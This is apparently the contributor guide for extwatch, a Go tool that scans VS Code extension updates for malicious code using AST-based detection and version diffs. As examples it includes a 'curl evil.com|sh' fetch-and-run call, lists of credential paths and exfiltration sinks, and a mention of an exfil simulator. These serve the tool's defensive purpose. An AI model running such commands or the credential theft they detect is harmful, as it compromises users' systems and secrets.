# Contributing to extwatch

Thanks for taking a look! This is a learning project, so **feedback, code
review, and PRs are all genuinely welcome** — including blunt critique of the Go
or the detection approach. If something is wrong or could be done better, please
open an issue or say so in a PR.

## Getting started

```bash
git clone https://github.com/dymchenkko/extwatch
cd extwatch
go build ./...      # build everything
go test ./...       # run the unit tests
go vet ./...        # static checks
gofmt -l .          # should print nothing (run `gofmt -w .` to fix)
```

Run it against your real extensions:

```bash
go build -o extwatch ./cmd/extwatch && ./extwatch
```

Try the safe attack simulator (no real risk — payloads are inert and point at
`example.com`):

```bash
PAYLOAD=exfil ./simulate.sh <an-installed-extension-folder-name>
```

## Project layout

```
cmd/extwatch/      entry point (flags, signals, pipeline)
internal/
  extension/       Extension type + directory-name parsing
  watcher/         fsnotify + debounce
  fetcher/         marketplace API, .vsix download, JS + package.json extraction
  analyzer/        version diff, scoring, report model
  astscanner/      JS AST-based detection engine (replaces regex)
  notifier/        terminal report + desktop notification
```

Tests live next to the package they cover.

## How detection works

Detection is two-pass over the JavaScript AST, using `tdewolff/parse/v2/js`.

**Pass 1 — binding tracker** (`internal/astscanner/scanner.go`)

Collects every `require()` assignment so renamed variables are resolved:

```js
const cp10 = require('child_process');       // maps cp10 → "child_process"
const { exec } = require('child_process');   // maps exec → "child_process"
```

This is why the AST scanner catches bundler-renamed variables that regex misses.
See `internal/astscanner/ATTACKS.md` for the full list of attack patterns covered.

**Pass 2 — detector**

Walks the AST and checks four node types:

| Node type | What it catches |
|---|---|
| `CallExpr` | `cp.exec(...)`, `eval(...)`, `fetch(...)`, `setTimeout("string", ...)` |
| `NewExpr` | `new Function(...)`, `new WebSocket(...)`, `new XMLHttpRequest()` |
| `DotExpr` / `IndexExpr` | `process.env`, `process['env']` (bracket notation) |
| `LiteralExpr` (string) | credential paths: `.ssh`, `.aws`, `.npmrc`, `.kube`, `.docker` |

The detection catalogues live in `internal/astscanner/scanner.go`:
- `moduleMethodCatalogue` — dangerous methods on known modules
- `globalCallCatalogue` — dangerous bare function calls
- `newExprCatalogue` — dangerous constructors
- `credPathCatalogue` — sensitive path fragments in string literals

### Adding a new pattern

1. Decide which catalogue it belongs to (most new patterns go in `moduleMethodCatalogue`).
2. Add a row with module, method, display name, and severity.
3. Add a test in `internal/astscanner/scanner_test.go` (pattern fires) and a negative
   test (pattern does not fire on benign code).
4. Add a row to `internal/astscanner/ATTACKS.md`.

Example — detecting `dns.lookup()` as an exfiltration channel:

```go
{"dns", "lookup", "dns.lookup(", Medium},
```

## How the diff works

`analyzer.Analyze` runs the AST scanner over the new version and keeps only
findings absent from the old version. The rule, applied in order:

1. **New file** — file was not in the old version → all its findings are introduced.
2. **Readable line** (`len(line) ≤ 300 chars`) — the exact trimmed source line is absent
   from the old corpus → finding is introduced.
3. **Minified line** (`len(line) > 300 chars`) — exact-text comparison is useless because
   bundlers reformat and rename variables between versions. Instead, compare the AST
   *finding signature*: `(pattern, module, first-string-argument)`.

**Why signatures beat text for minified bundles**

A bundler renames `cp` → `a` between versions. After renaming the line text changes,
but the AST resolves both to the same module. So `a.exec('id')` and `cp.exec('id')`
both produce signature `("exec(", "child_process", "id")` — same call, not newly introduced.
A new `exec('curl evil.com|sh')` produces a different signature and is correctly flagged.

**Known diff limitation**

Two calls with identical `(pattern, module, arg)` in a minified file look the same.
If old code had `exec('build')` and new code adds another `exec('build')`, the second
call is not flagged. In practice malicious calls use distinct arguments and are caught.

## Ground rules

- Run `gofmt -w .`, `go vet ./...`, and `go test ./...` before opening a PR.
- Keep functions small and commented in the existing style (this is a learning
  codebase — clarity over cleverness).
- New detection patterns: add to the relevant catalogue in `internal/astscanner/scanner.go`,
  add a test in `internal/astscanner/scanner_test.go`, and document the attack in
  `internal/astscanner/ATTACKS.md`.

## Good first issues

Concrete, self-contained things that would genuinely help:

- **Broaden credential patterns** — detect browser "Login Data" paths,
  macOS `keychain`, and Windows `Credentials` store access.
- **More network sinks** — raw IP-address literals, known exfil endpoints
  (Discord/Telegram webhooks, pastebin URLs).
- **Obfuscation heuristic** — flag likely-encoded payloads: `Buffer.from(..., 'base64')`,
  `atob(`, and long `\x..`/hex string runs.
- **Tests for the fetcher** — feed an in-memory `.vsix` (zip) to the extractor
  and assert the JS map + manifest come out correctly.
- **Open VSX support** — add the Open VSX registry as a fallback baseline source
  for extensions not on the Microsoft marketplace.

## A note on the threat model

For a packaged `.vsix`, the code that matters most is what runs on **activation**
(`activate()`, gated by `activationEvents`), not npm install scripts — VS Code
doesn't run `postinstall` when it unpacks an extension. extwatch still flags
install scripts because they're a red flag in a manifest and matter when an
extension is installed from source or pulled in as a dependency. Keep this
distinction in mind when proposing detection changes.
